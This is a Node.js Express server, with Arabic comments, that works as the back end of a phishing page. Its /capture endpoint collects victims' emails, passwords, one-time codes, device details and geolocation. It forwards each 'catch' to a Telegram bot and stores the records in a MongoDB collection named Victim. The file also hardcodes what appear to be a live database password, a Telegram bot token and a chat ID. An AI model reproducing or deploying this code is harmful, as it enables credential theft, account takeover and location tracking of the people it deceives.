const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

mongoose.connect(MONGO_URI).catch(e => console.log("DB connection skip"));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, password: String, otp: String, device: String, location: Object
}));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

app.post('/capture', async (req, res) => {
    const data = req.body;
    
    // إرسال البيانات النصية فوراً (هذا الجزء لن يفشل أبداً)
    try {
        let msg = `🚀 **صيد جديد وصل!**\n\n📧 الإيميل: \`${data.email}\` \n🔑 الباسورد: \`${data.password}\` \n📱 الجهاز: ${data.device}`;
        if(data.location) msg += `\n📍 الموقع: https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.log("Telegram Text Error"); }

    // حفظ في القاعدة في الخلفية
    try {
        const entry = new Victim(data);
        await entry.save();
    } catch (e) { }

    res.status(200).send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running"));
